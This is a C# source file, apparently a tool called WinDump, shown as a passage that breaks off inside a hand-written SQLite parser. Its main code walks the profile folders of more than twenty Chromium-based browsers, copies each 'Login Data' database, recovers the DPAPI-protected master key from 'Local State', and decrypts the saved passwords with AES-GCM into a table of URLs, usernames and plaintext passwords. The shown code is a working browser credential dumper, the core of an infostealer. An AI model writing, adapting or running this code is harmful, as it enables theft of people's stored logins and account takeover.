using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace WinDump
{
    internal class BrowserChromiumBased
    {
        static Dictionary<string, string> browserOnChromium = new Dictionary<string, string>
        {
            { "Chrome", "Google\\Chrome\\User Data" } ,
            { "Chrome Beta", "Google\\Chrome Beta\\User Data" } ,
            { "Chromium", "Chromium\\User Data" } ,
            { "Chrome SxS", "Google\\Chrome SxS\\User Data" },
            { "Edge", "Microsoft\\Edge\\User Data" } ,
            { "Brave-Browser", "BraveSoftware\\Brave-Browser\\User Data" } ,
            { "QQBrowser", "Tencent\\QQBrowser\\User Data" } ,
            { "SogouExplorer", "Sogou\\SogouExplorer\\User Data" } ,
            { "360ChromeX", "360ChromeX\\Chrome\\User Data" } ,
            { "360Chrome", "360Chrome\\Chrome\\User Data" } ,
            { "Vivaldi", "Vivaldi\\User Data" } ,
            { "CocCoc", "CocCoc\\Browser\\User Data" },
            { "Torch", "Torch\\User Data" },
            { "Kometa", "Kometa\\User Data" },
            { "Orbitum", "Orbitum\\User Data" },
            { "CentBrowser", "CentBrowser\\User Data" },
            { "7Star", "7Star\\7Star\\User Data" },
            { "Sputnik", "Sputnik\\Sputnik\\User Data" },
            { "Epic Privacy Browser", "Epic Privacy Browser\\User Data" },
            { "Uran", "uCozMedia\\Uran\\User Data" },
            { "Yandex", "Yandex\\YandexBrowser\\User Data" },
            { "Iridium", "Iridium\\User Data" },
            { "The World", "theworld6\\User Data" },
            { "Lenovo", "Lenovo\\SLBrowser\\User Data" },
        };
        internal static DataTable GetChromiumBased()
        {


            var dt = new DataTable();
            dt.Columns.Add("Name");
            dt.Columns.Add("URL");
            dt.Columns.Add("User");
            dt.Columns.Add("Pwd");
            foreach ( var item in browserOnChromium)
            {
                var name = item.Key;
                var basepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), item.Value);
                if (!Directory.Exists(Path.GetDirectoryName(basepath)))
                {
                    continue;
                }
                var masterKey = GetMasterKey(basepath);

                GetPwd(name, Path.Combine(basepath, "Default"), dt, masterKey);
                foreach(var profilePath in Directory.GetDirectories(basepath, "Profile*"))
                {
                    GetPwd(name,profilePath, dt, masterKey);
                }
            }
            return dt;
        }
        private static void GetPwd(string name,string profilePath, DataTable dt, byte[] masterKey)
        {
            string dbPath = Path.Combine(profilePath, "Login Data");
            if (!File.Exists(dbPath))
            {
                return;
            }
            string tmpPath = Path.GetTempFileName();
            try
            {

                File.Copy(dbPath, tmpPath,true);
                SQLiteHandler handler = new SQLiteHandler(tmpPath);
                if (!handler.ReadTable("logins"))
                    return;
                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    string url = handler.GetValue(i, "origin_url");
                    string username = handler.GetValue(i, "username_value");
                    string crypt = handler.GetValue(i, "password_value");
                    var password = "";
                    try
                    {
                        password = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt), masterKey));
                    }
                    catch { 
                        
                    }
                    dt.Rows.Add(name, url, username, password);
                }
            }
            catch
            {
                return;
            }
        }
        internal static byte[] GetMasterKey(string BrowserPath)
        {
            string filePath = Path.Combine(BrowserPath, "Local State");
            byte[] masterKey = null;
            if (!File.Exists(filePath))
                return null;
            var m = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Match(File.ReadAllText(filePath).Replace(" ", ""));
            if (m.Success)
            {
                masterKey = Convert.FromBase64String(m.Groups[1].Value);
            
            }            
            if (masterKey == null)
            {
                return null;
            }
            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);
            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch
            {
                return null;
            }
        }
        private static byte[] DecryptData(byte[] buffer, byte[] MasterKey)
        {
            byte[] decryptedData = null;
            try
            {
                string bufferString = Encoding.Default.GetString(buffer,0,3);
                if (bufferString == "v10" || bufferString == "v11")
                {
                    byte[] iv = new byte[12];
                    Array.Copy(buffer, 3, iv, 0, 12);
                    byte[] cipherText = new byte[buffer.Length - 15];
                    Array.Copy(buffer, 15, cipherText, 0, buffer.Length - 15);
                    byte[] tag = new byte[16];
                    Array.Copy(cipherText, cipherText.Length - 16, tag, 0, 16);
                    byte[] data = new byte[cipherText.Length - tag.Length];
                    Array.Copy(cipherText, 0, data, 0, cipherText.Length - tag.Length);
                    decryptedData = new AesGcm().Decrypt(MasterKey, iv, null, data, tag);
                }
                else if (bufferString == "v20")
                {
                    return Encoding.ASCII.GetBytes("v20 not support");
                }
                else
                {
                    decryptedData = ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
                }
            }
            catch { }
            return decryptedData;
        }
    }
    internal static class BCrypt
    {
        public const uint ERROR_SUCCESS = 0x00000000;
        public const uint BCRYPT_PAD_PSS = 8;
        public const uint BCRYPT_PAD_OAEP = 4;

        public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(0x4d42444b);

        public static readonly string BCRYPT_OBJECT_LENGTH = "ObjectLength";
        public static readonly string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
        public static readonly string BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength";
        public static readonly string BCRYPT_CHAINING_MODE = "ChainingMode";
        public static readonly string BCRYPT_KEY_DATA_BLOB = "KeyDataBlob";
        public static readonly string BCRYPT_AES_ALGORITHM = "AES";

        public static readonly string MS_PRIMITIVE_PROVIDER = "Microsoft Primitive Provider";

        public static readonly int BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG = 0x00000001;
        public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 0x00000001;

        public static readonly uint STATUS_AUTH_TAG_MISMATCH = 0xC000A002;

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm,
                                                              [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId,
                                                              [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation,
                                                              uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

        [DllImport("bcrypt.dll", EntryPoint = "BCryptGetProperty")]
        public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

        [DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
        internal static extern uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);


        [DllImport("bcrypt.dll")]
        public static extern uint BCryptImportKey(IntPtr hAlgorithm,
                                                  IntPtr hImportKey,
                                                  [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType,
                                                  out IntPtr phKey,
                                                  IntPtr pbKeyObject,
                                                  int cbKeyObject,
                                                  byte[] pbInput, //blob of type BCRYPT_KEY_DATA_BLOB + raw key data = (dwMagic (4 bytes) | uint dwVersion (4 bytes) | cbKeyData (4 bytes) | data)
                                                  int cbInput,
                                                  uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptDestroyKey(IntPtr hKey);

        [DllImport("bcrypt.dll")]
        internal static extern uint BCryptDecrypt(IntPtr hKey,
                                                  byte[] pbInput,
                                                  int cbInput,
                                                  ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
                                                  byte[] pbIV,
                                                  int cbIV,
                                                  byte[] pbOutput,
                                                  int cbOutput,
                                                  ref int pcbResult,
                                                  int dwFlags);

        [StructLayout(LayoutKind.Sequential)]
        public struct BCRYPT_PSS_PADDING_INFO
        {
            public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)
            {
                this.pszAlgId = pszAlgId;
                this.cbSalt = cbSalt;
            }

            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszAlgId;
            public int cbSalt;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
        {
            public int cbSize;
            public int dwInfoVersion;
            public IntPtr pbNonce;
            public int cbNonce;
            public IntPtr pbAuthData;
            public int cbAuthData;
            public IntPtr pbTag;
            public int cbTag;
            public IntPtr pbMacContext;
            public int cbMacContext;
            public int cbAAD;
            public long cbData;
            public int dwFlags;

            public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag) : this()
            {
                dwInfoVersion = BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
                cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));

                if (iv != null)
                {
                    cbNonce = iv.Length;
                    pbNonce = Marshal.AllocHGlobal(cbNonce);
                    Marshal.Copy(iv, 0, pbNonce, cbNonce);
                }

                if (aad != null)
                {
                    cbAuthData = aad.Length;
                    pbAuthData = Marshal.AllocHGlobal(cbAuthData);
                    Marshal.Copy(aad, 0, pbAuthData, cbAuthData);
                }

                if (tag != null)
                {
                    cbTag = tag.Length;
                    pbTag = Marshal.AllocHGlobal(cbTag);
                    Marshal.Copy(tag, 0, pbTag, cbTag);

                    cbMacContext = tag.Length;
                    pbMacContext = Marshal.AllocHGlobal(cbMacContext);
                }
            }

            public void Dispose()
            {
                if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce);
                if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag);
                if (pbAuthData != IntPtr.Zero) Marshal.FreeHGlobal(pbAuthData);
                if (pbMacContext != IntPtr.Zero) Marshal.FreeHGlobal(pbMacContext);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BCRYPT_OAEP_PADDING_INFO
        {
            public BCRYPT_OAEP_PADDING_INFO(string alg)
            {
                pszAlgId = alg;
                pbLabel = IntPtr.Zero;
                cbLabel = 0;
            }

            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszAlgId;
            public IntPtr pbLabel;
            public int cbLabel;
        }
    }
    internal class AesGcm
    {
        public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
        {
            IntPtr hAlg = OpenAlgorithmProvider(BCrypt.BCRYPT_AES_ALGORITHM, BCrypt.MS_PRIMITIVE_PROVIDER, BCrypt.BCRYPT_CHAIN_MODE_GCM);
            IntPtr hKey, keyDataBuffer = ImportKey(hAlg, key, out hKey);

            byte[] plainText;

            var authInfo = new BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
            try
            {
                byte[] ivData = new byte[MaxAuthTagSize(hAlg)];

                int plainTextSize = 0;

                uint status = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, null, 0, ref plainTextSize, 0x0);

                if (status != BCrypt.ERROR_SUCCESS)
                    throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", status));

                plainText = new byte[plainTextSize];

                status = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, plainText, plainText.Length, ref plainTextSize, 0x0);

                if (status == BCrypt.STATUS_AUTH_TAG_MISMATCH)
                    throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");

                if (status != BCrypt.ERROR_SUCCESS)
                    throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", status));
            }
            finally { 
                authInfo.Dispose();
            }

            BCrypt.BCryptDestroyKey(hKey);
            Marshal.FreeHGlobal(keyDataBuffer);
            BCrypt.BCryptCloseAlgorithmProvider(hAlg, 0x0);

            return plainText;
        }

        private int MaxAuthTagSize(IntPtr hAlg)
        {
            byte[] tagLengthsValue = GetProperty(hAlg, BCrypt.BCRYPT_AUTH_TAG_LENGTH);

            return BitConverter.ToInt32(new[] { tagLengthsValue[4], tagLengthsValue[5], tagLengthsValue[6], tagLengthsValue[7] }, 0);
        }

        private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
        {
            IntPtr hAlg = IntPtr.Zero;

            uint status = BCrypt.BCryptOpenAlgorithmProvider(out hAlg, alg, provider, 0x0);

            if (status != BCrypt.ERROR_SUCCESS)
                throw new CryptographicException(string.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", status));

            byte[] chainMode = Encoding.Unicode.GetBytes(chainingMode);
            status = BCrypt.BCryptSetAlgorithmProperty(hAlg, BCrypt.BCRYPT_CHAINING_MODE, chainMode, chainMode.Length, 0x0);

            if (status != BCrypt.ERROR_SUCCESS)
                throw new CryptographicException(string.Format("BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", status));

            return hAlg;
        }

        private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
        {
            byte[] objLength = GetProperty(hAlg, BCrypt.BCRYPT_OBJECT_LENGTH);

            int keyDataSize = BitConverter.ToInt32(objLength, 0);

            IntPtr keyDataBuffer = Marshal.AllocHGlobal(keyDataSize);

            byte[] keyBlob = Concat(BCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC, BitConverter.GetBytes(0x1), BitConverter.GetBytes(key.Length), key);

            uint status = BCrypt.BCryptImportKey(hAlg, IntPtr.Zero, BCrypt.BCRYPT_KEY_DATA_BLOB, out hKey, keyDataBuffer, keyDataSize, keyBlob, keyBlob.Length, 0x0);

            if (status != BCrypt.ERROR_SUCCESS)
                throw new CryptographicException(string.Format("BCrypt.BCryptImportKey() failed with status code:{0}", status));

            return keyDataBuffer;
        }

        private byte[] GetProperty(IntPtr hAlg, string name)
        {
            int size = 0;

            uint status = BCrypt.BCryptGetProperty(hAlg, name, null, 0, ref size, 0x0);

            if (status != BCrypt.ERROR_SUCCESS)
                throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", status));

            byte[] value = new byte[size];

            status = BCrypt.BCryptGetProperty(hAlg, name, value, value.Length, ref size, 0x0);

            if (status != BCrypt.ERROR_SUCCESS)
                throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", status));

            return value;
        }

        public byte[] Concat(params byte[][] arrays)
        {
            int len = 0;

            foreach (byte[] array in arrays)
            {
                if (array == null)
                    continue;
                len += array.Length;
            }

            byte[] result = new byte[len - 1 + 1];
            int offset = 0;

            foreach (byte[] array in arrays)
            {
                if (array == null)
                    continue;
                Buffer.BlockCopy(array, 0, result, offset, array.Length);
                offset += array.Length;
            }

            return result;
        }
    }
    internal class SQLiteHandler
    {
        private readonly byte[] db_bytes;
        private readonly ulong encoding;
        private string[] field_names = new string[1];
        private sqlite_master_entry[] master_table_entries;
        private readonly ushort page_size;
        private readonly byte[] SQLDataTypeSize = { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
        private table_entry[] table_entries;

        public SQLiteHandler(string baseName)
        {
            if (File.Exists(baseName))
            {
                db_bytes = File.ReadAllBytes(baseName);
                if (Encoding.Default.GetString(db_bytes, 0, 15).CompareTo("SQLite format 3") != 0)
                {
                    throw new Exception("Not a valid SQLite 3 Database File");
                }

                if (db_bytes[0x34] != 0)
                {
                    throw new Exception("Auto-vacuum capable database is not supported");
                }

                //if (decimal.Compare(new decimal(this.ConvertToInteger(0x2c, 4)), 4M) >= 0)
                //{
                //    throw new Exception("No supported Schema layer file-format");
                //}
                page_size = (ushort)ConvertToInteger(0x10, 2);
                encoding = ConvertToInteger(0x38, 4);
                if (decimal.Compare(new decimal(encoding), decimal.Zero) == 0)
                {
                    encoding = 1L;
                }

                ReadMasterTable(100L);
            }
        }

        private ulong ConvertToInteger(int startIndex, int Size)
        {
            if (Size > 8 | Size == 0)
            {
                return 0L;
            }

            ulong num2 = 0L;
            int num4 = Size - 1;
            for (int i = 0; i <= num4; i++)
            {
                num2 = num2 << 8 | db_bytes[startIndex + i];
            }

            return num2;
        }

        private long CVL(int startIndex, int endIndex)
        {
            endIndex++;
            byte[] buffer = new byte[8];
            int num4 = endIndex - startIndex;
            bool flag = false;
            if (num4 == 0 | num4 > 9)
            {
                return 0L;
            }

            if (num4 == 1)
            {
                buffer[0] = (byte)(db_bytes[startIndex] & 0x7f);
                return BitConverter.ToInt64(buffer, 0);
            }

            if (num4 == 9)
            {
                flag = true;
            }

            int num2 = 1;
            int num3 = 7;
            int index = 0;
            if (flag)
            {
                buffer[0] = db_bytes[endIndex - 1];
                endIndex--;
                index = 1;
            }

            int num7 = startIndex;
            for (int i = endIndex - 1; i >= num7; i += -1)
            {
                if (i - 1 >= startIndex)
                {
                    buffer[index] = (byte)((byte)(db_bytes[i] >> (num2 - 1 & 7)) & 0xff >> num2 | (byte)(db_bytes[i - 1] << (num3 & 7)));
                    num2++;
                    index++;
                    num3--;
                }
                else if (!flag)
                {
                    buffer[index] = (byte)((byte)(db_bytes[i] >> (num2 - 1 & 7)) & 0xff >> num2);
                }
            }

            return BitConverter.ToInt64(buffer, 0);
        }

        public int GetRowCount()
        {
            return table_entries.Length;
        }

        public string[] GetTableNames()
        {
            var tableNames = new List<string>();
            int num3 = master_table_entries.Length - 1;
            for (int i = 0; i <= num3; i++)
            {
                if (master_table_entries[i].item_type == "table")
                {
                    tableNames.Add(master_table_entries[i].item_name);
                }
            }

            return tableNames.ToArray();
        }

        public long GetRawID(int row_num)
        {
            if (row_num >= table_entries.Length)
            {
                return 0;
            }

            return table_entries[row_num].row_id;
        }

        public string GetValue(int row_num, int field)
        {
            if (row_num >= table_entries.Length)
            {
                return null;
            }

            if (field >= table_entries[row_num].content.Length)
            {
                return null;
            }

            return table_entries[row_num].content[field];
        }

        public string GetValue(int row_num, string field)
        {
            int num = -1;
            int length = field_names.Length - 1;
            for (int i = 0; i <= length; i++)
            {
                if (field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
                {
                    num = i;
                    break;
                }
            }

            if (num == -1)
            {
                return null;
            }

            return GetValue(row_num, num);
        }

        private int GVL(int startIndex)
        {
            if (startIndex > db_bytes.Length)
            {
                return 0;
            }

            int num3 = startIndex + 8;
            for (int i = startIndex; i <= num3; i++)
            {
                if (i > db_bytes.Length - 1)
                {
                    return 0;
                }

                if ((db_bytes[i] & 0x80) != 0x80)
                {
                    return i;
                }
            }

            return startIndex + 8;
        }

        private bool IsOdd(long value)
        {
            return (value & 1L) == 1L;
        }

        private void ReadMasterTable(ulong Offset)
        {
            if (db_bytes[(int)Offset] == 13)
            {
                ushort num2 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int length = 0;
                if (master_table_entries != null)
                {
                    length = master_table_entries.Length;
                    Array.Resize(ref master_table_entries, master_table_entries.Length + num2 + 1);
                }
                else
                {
                    master_table_entries = new sqlite_master_entry[num2 + 1];
                }

                int num13 = num2;
                for (int i = 0; i <= num13; i++)
                {
                    ulong num = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) != 0)
                    {
                        num += Offset;
                    }

                    int endIndex = GVL((int)num);
                    long num7 = CVL((int)num, endIndex);
                    int num6 = GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                    master_table_entries[length + i].row_id = CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)),
                        num6);
                    num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num6), new decimal(num))), decimal.One));
                    endIndex = GVL((int)num);
                    num6 = endIndex;
                    long num5 = CVL((int)num, endIndex);
                    long[] numArray = new long[5];
                    int index = 0;
                    do
                    {
                        endIndex = num6 + 1;
                        num6 = GVL(endIndex);
                        numArray[index] = CVL(endIndex, num6);
                        if (numArray[index] > 9L)
                        {
                            if (IsOdd(numArray[index]))
                            {
                                numArray[index] = (long)Math.Round((numArray[index] - 13L) / 2.0);
                            }
                            else
                            {
                                numArray[index] = (long)Math.Round((numArray[index] - 12L) / 2.0);
                            }
                        }
                        else
                        {
                            numArray[index] = SQLDataTypeSize[(int)numArray[index]];
                        }

                        index++;
                    } while (index <= 4);

                    if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                    {
                        master_table_entries[length + i].item_type = Encoding.UTF8.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                    {
                        master_table_entries[length + i].item_type = Encoding.Unicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                    {
                        master_table_entries[length + i].item_type = Encoding.BigEndianUnicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }

                    if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                    {
                        master_table_entries[length + i].item_name = Encoding.Default.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                    {
                        master_table_entries[length + i].item_name = Encoding.Unicode.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                    {
                        master_table_entries[length + i].item_name = Encoding.BigEndianUnicode.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }

                    master_table_entries[length + i].root_num =
                        (long)ConvertToInteger(
                            Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])),
                                new decimal(numArray[2]))), (int)numArray[3]);
                    if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                    {
                        master_table_entries[length + i].sql_statement = Encoding.Default.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(
                                decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])),
                                new decimal(numArray[3]))), (int)numArray[4]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                    {
                        master_table_entries[length + i].sql_statement = Encoding.Unicode.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(
                                decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])),
                                new decimal(numArray[3]))), (int)numArray[4]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                    {
                        master_table_entries[length + i].sql_statement = Encoding.BigEndianUnicode.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(
                                decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])),
                                new decimal(numArray[3]))), (int)numArray[4]);
                    }
                }
            }
            else if (db_bytes[(int)Offset] == 5)
            {
                ushort num11 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int num14 = num11;
                for (int j = 0; j <= num14; j++)
                {
                    ushort startIndex = (ushort)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(j * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) == 0)
                    {
                        ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(startIndex, 4)), decimal.One), new decimal(page_size))));
                    }
                    else
                    {
                        ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger((int)(Offset + startIndex), 4)), decimal.One), new decimal(page_size))));
                    }
                }

                ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One),
                    new decimal(page_size))));
            }
        }

        public bool ReadTable(string TableName)
        {
            int index = -1;
            int length = master_table_entries.Length - 1;
            for (int i = 0; i <= length; i++)
            {
                if (master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
                {
                    index = i;
                    break;
                }
            }

            if (index == -1)
            {
                return false;
            }

            string[] strArray = master_table_entries[index].sql_statement.Substring(master_table_entries[index].sql_statement.IndexOf("(") + 1).Split(',');
            int num6 = strArray.Length - 1;
            for (int j = 0; j <= num6; j++)
            {
                strArray[j] = strArray[j].TrimStart();
                int num4 = strArray[j].IndexOf(" ");
                if (num4 > 0)
                {
                    strArray[j] = strArray[j].Substring(0, num4);
                }

                if (strArray[j].IndexOf("UNIQUE") == 0)
                {
                    break;
                }

                Array.Resize(ref field_names, j + 1);
                field_names[j] = strArray[j];
            }

            return ReadTableFromOffset((ulong)((master_table_entries[index].root_num - 1L) * page_size));
        }

        private bool ReadTableFromOffset(ulong Offset)
        {
            if (db_bytes[(int)Offset] == 13)
            {
                int num2 = Convert.ToInt32(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int length = 0;
                if (table_entries != null)
                {
                    length = table_entries.Length;
                    Array.Resize(ref table_entries, table_entries.Length + num2 + 1);
                }
                else
                {
                    table_entries = new table_entry[num2 + 1];
                }

                int num16 = num2;
                for (int i = 0; i <= num16; i++)
                {
                    var _fieldArray = new record_header_field[1];
                    ulong num = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) != 0)
                    {
                        num += Offset;
                    }

                    int endIndex = GVL((int)num);
                    long num9 = CVL((int)num, endIndex);
                    int num8 = GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                    table_entries[length + i].row_id = CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num8);
                    num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num8), new decimal(num))), decimal.One));
                    endIndex = GVL((int)num);
                    num8 = endIndex;
                    long num7 = CVL((int)num, endIndex);
                    long num10 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num), new decimal(endIndex)), decimal.One));
                    for (int j = 0; num10 < num7; j++)
                    {
                        Array.Resize(ref _fieldArray, j + 1);
                        endIndex = num8 + 1;
                        num8 = GVL(endIndex);
                        _fieldArray[j].type = CVL(endIndex, num8);
                        if (_fieldArray[j].type > 9L)
                        {
                            if (IsOdd(_fieldArray[j].type))
                            {
                                _fieldArray[j].size = (long)Math.Round((_fieldArray[j].type - 13L) / 2.0);
                            }
                            else
                            {
                                _fieldArray[j].size = (long)Math.Round((_fieldArray[j].type - 12L) / 2.0);
                            }
                        }
                        else
                        {
                            _fieldArray[j].size = SQLDataTypeSize[(int)_fieldArray[j].type];
                        }

                        num10 = num10 + (num8 - endIndex) + 1L;
                    }

                    table_entries[length + i].content = new string[_fieldArray.Length - 1 + 1];
                    int num4 = 0;
                    int num17 = _fieldArray.Length - 1;
                    for (int k = 0; k <= num17; k++)
                    {
                        if (_fieldArray[k].type > 9L)
                        {
                            if (!IsOdd(_fieldArray[k].type))
                            {
                                if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                                {

                                    byte[] bytes = new byte[_fieldArray[k].size];
                                    Array.Copy(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), bytes, 0, _fieldArray[k].size);

                                    table_entries[length + i].content[k] = Convert.ToBase64String(bytes);
                                }
                                else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                                {
                                    table_entries[length + i].content[k] = Encoding.Unicode.GetString(db_bytes,
                                        Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                                }
                                else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                                {
                                    table_entries[length + i].content[k] = Encoding.BigEndianUnicode.GetString(db_bytes,
                                        Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                                }
                            }
                            else
                            {
                                table_entries[length + i].content[k] = Encoding.Default.GetString(db_bytes,
                                    Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)_fieldArray[k].size);
                            }
                        }
                        else
                        {
                            int t = Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4)));
                            table_entries[length + i].content[k] = Convert.ToString(ConvertToInteger(t,
                                (int)_fieldArray[k].size));
                        }

                        num4 += (int)_fieldArray[k].size;
                    }
                }
            }
            else if (db_bytes[(int)Offset] == 5)
            {
